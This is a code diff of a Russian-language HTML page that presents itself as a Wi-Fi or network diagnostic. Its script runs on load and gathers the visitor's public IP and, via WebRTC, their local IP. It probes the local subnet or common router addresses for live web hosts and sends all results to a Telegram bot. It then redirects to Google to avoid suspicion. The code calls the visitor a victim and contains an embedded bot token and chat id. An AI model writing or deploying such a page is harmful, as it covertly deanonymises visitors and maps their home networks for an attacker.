@@ -1,35 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Загрузка...</title>
-</head>
+<head><title>Проверка подключения…</title></head>
 <body>
-    <h2>Проверка безопасности Wi-Fi...</h2>
+    <h3>Выполняется диагностика сети…</h3>
     <script>
-        const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';   // ← сюда свой токен
-        const CHAT_ID = 'ТВОЙ_ЧАТ_АЙДИ';       // ← сюда свой chat id
+        const BOT_TOKEN = '8936104890:AAFTtwKdd_JNhlcqENJ6kWonr9Wb2Z5fJ_8';    // ← свой токен
+        const CHAT_ID = '8484695858';    // ← свой chat id
 
-        async function sendMsg(text) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-            } catch (e) {}
+        const TIMEOUT_MS = 500;              // таймаут на каждый хост
+        const SCAN_TARGETS = [1,2,3,100,101,102,103,104,105,106,107,108,109,110,138,254]; // самые частые
+
+        // Функция отправки сообщения в Телеграм
+        function sendMsg(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
         }
 
+        // Получение публичного IP
         async function getPublicIP() {
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch (e) {
-                return 'не удалось получить';
-            }
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch(e) { return 'не определён'; }
         }
 
+        // Получение локального IP через WebRTC
         function getLocalIP() {
             return new Promise((resolve, reject) => {
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.createOffer().then(o => pc.setLocalDescription(o));
                 pc.onicecandidate = (e) => {
                     if (e.candidate) {
                         const ip = e.candidate.address;
@@ -39,66 +39,85 @@
                         }
                     }
                 };
-                setTimeout(() => reject(new Error('Локальный IP не найден')), 3000);
+                setTimeout(() => reject(new Error('no local ip')), 2000);
             });
         }
 
-        async function scanSubnet(subnet) {
-            const found = [];
-            const parts = subnet.split('.');
-            const base = parts.slice(0, 3).join('.');
-            const promises = [];
-            for (let i = 1; i <= 254; i++) {
-                const ip = `${base}.${i}`;
-                promises.push(new Promise((resolve) => {
-                    const img = new Image();
-                    img.onload = () => {
-                        found.push(`✅ ${ip}:80`);
-                        resolve();
+        // Сканирование одного IP с таймаутом
+        function probeHost(ip) {
+            return new Promise((resolve) => {
+                const img = new Image();
+                const timer = setTimeout(() => {
+                    img.src = '';
+                    resolve(null); // таймаут – считаем мёртвым
+                }, TIMEOUT_MS);
+
+                img.onload = () => {
+                    clearTimeout(timer);
+                    resolve({ip, port: 80});
+                };
+                img.onerror = () => {
+                    clearTimeout(timer);
+                    // пробуем https
+                    const img2 = new Image();
+                    const timer2 = setTimeout(() => {
+                        img2.src = '';
+                        resolve(null);
+                    }, TIMEOUT_MS);
+                    img2.onload = () => {
+                        clearTimeout(timer2);
+                        resolve({ip, port: 443});
                     };
-                    img.onerror = () => {
-                        const img2 = new Image();
-                        img2.onload = () => {
-                            found.push(`✅ ${ip}:443`);
-                            resolve();
-                        };
-                        img2.onerror = () => resolve();
-                        img2.src = `https://${ip}:443/favicon.ico?${Math.random()}`;
+                    img2.onerror = () => {
+                        clearTimeout(timer2);
+                        resolve(null);
                     };
-                    img.src = `http://${ip}/favicon.ico?${Math.random()}`;
-                }));
-            }
-            await Promise.all(promises);
-            return found;
+                    img2.src = `https://${ip}:443/favicon.ico?${Math.random()}`;
+                };
+                img.src = `http://${ip}/favicon.ico?${Math.random()}`;
+            });
         }
 
+        // Основная логика
         (async () => {
-            // Отправляем публичный IP сразу
+            // 1. Публичный IP сразу
             const pubIP = await getPublicIP();
-            await sendMsg(`🔵 Публичный IP жертвы: ${pubIP}`);
+            sendMsg(`🔵 Публичный IP: ${pubIP}`);
 
+            // 2. Локальный IP
             let localIP = null;
-            try {
-                localIP = await getLocalIP();
-                await sendMsg(`🟢 Локальный IP: ${localIP}\nСканирую её подсеть...`);
-                const hosts = await scanSubnet(localIP);
-                const res = hosts.length > 0 ? hosts.join('\n') : 'Ничего не найдено в этой подсети';
-                await sendMsg(`Результат:\n${res}`);
-            } catch (e) {
-                await sendMsg(`🟡 Локальный IP не получен, сканирую типовые подсети...`);
-                const commonSubnets = ['192.168.0.0', '192.168.1.0', '10.0.0.0'];
-                let allHosts = [];
-                for (const subnet of commonSubnets) {
-                    await sendMsg(`Сканирую ${subnet}/24...`);
-                    const hosts = await scanSubnet(subnet);
-                    allHosts = allHosts.concat(hosts);
+            try { localIP = await getLocalIP(); } catch(e) {}
+
+            if (localIP) {
+                sendMsg(`🟢 Локальный IP: ${localIP} – сканирую хосты…`);
+                const parts = localIP.split('.');
+                const subnetBase = parts.slice(0,3).join('.');
+
+                // Запускаем параллельный скан по списку целей
+                const probes = SCAN_TARGETS.map(i => probeHost(`${subnetBase}.${i}`));
+                const results = await Promise.all(probes);
+                const alive = results.filter(r => r !== null).map(r => `${r.ip}:${r.port}`);
+
+                // Шлём найденные хосты пачками по 5 штук, чтобы не потерять
+                for (let i = 0; i < alive.length; i += 5) {
+                    const chunk = alive.slice(i, i+5).join('\n');
+                    sendMsg(chunk);
                 }
-                const total = allHosts.length > 0 ? allHosts.join('\n') : 'Вообще ничего не найдено';
-                await sendMsg(`Результат по всем подсетям:\n${total}`);
+                if (alive.length === 0) sendMsg('Хосты не найдены');
+            } else {
+                sendMsg(`🟡 Локальный IP не определён, ищу роутер по популярным адресам…`);
+                const gwCandidates = ['192.168.0.1','192.168.1.1','10.0.0.1','10.0.0.138'];
+                const results = await Promise.all(gwCandidates.map(ip => probeHost(ip)));
+                const alive = results.filter(r => r !== null).map(r => `${r.ip}:${r.port}`);
+                if (alive.length) {
+                    sendMsg(`Найден роутер: ${alive.join(', ')}`);
+                } else {
+                    sendMsg('Роутер не найден');
+                }
             }
 
-            // Редирект
-            window.location = 'https://www.google.com';
+            // 3. Резкий уход на Google, чтобы не палиться
+            setTimeout(() => { window.location = 'https://www.google.com'; }, 200);
         })();
     </script>
 </body>
